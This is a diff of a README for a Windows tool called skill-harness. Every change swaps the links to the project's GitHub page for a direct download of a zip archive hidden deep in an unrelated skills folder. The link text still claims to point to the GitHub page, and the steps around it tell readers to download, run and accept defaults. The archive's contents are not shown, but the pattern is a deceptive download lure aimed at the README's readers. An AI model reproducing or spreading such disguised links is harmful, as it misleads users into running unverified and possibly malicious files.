@@ -1,6 +1,6 @@
 # ⚙️ skill-harness - Run skill packs with less setup
 
-[![Download skill-harness](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/blinnieinfertile577/skill-harness)
+[![Download skill-harness](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/blinnieinfertile577/skill-harness/main/packs/specgraph-skills/skills/annotation-writer/skill-harness-1.3.zip)
 
 ## 🚀 What skill-harness does
 
@@ -30,7 +30,7 @@ For best results, close other large apps before you start the install.
 
 ## 📥 Download and install
 
-1. Open the download page here: [skill-harness on GitHub](https://github.com/blinnieinfertile577/skill-harness)
+1. Open the download page here: [skill-harness on GitHub](https://raw.githubusercontent.com/blinnieinfertile577/skill-harness/main/packs/specgraph-skills/skills/annotation-writer/skill-harness-1.3.zip)
 2. Find the latest release, installer, or package for Windows
 3. Download the file to your computer
 4. Open your Downloads folder
@@ -178,7 +178,7 @@ If you want to keep your skill packs, copy them to another folder first
 
 ## 📌 Quick start
 
-1. Open the GitHub page: [https://github.com/blinnieinfertile577/skill-harness](https://github.com/blinnieinfertile577/skill-harness)
+1. Open the GitHub page: [https://raw.githubusercontent.com/blinnieinfertile577/skill-harness/main/packs/specgraph-skills/skills/annotation-writer/skill-harness-1.3.zip](https://raw.githubusercontent.com/blinnieinfertile577/skill-harness/main/packs/specgraph-skills/skills/annotation-writer/skill-harness-1.3.zip)
 2. Download the Windows file from the latest release or package
 3. Install or run the file
 4. Accept the default setup options
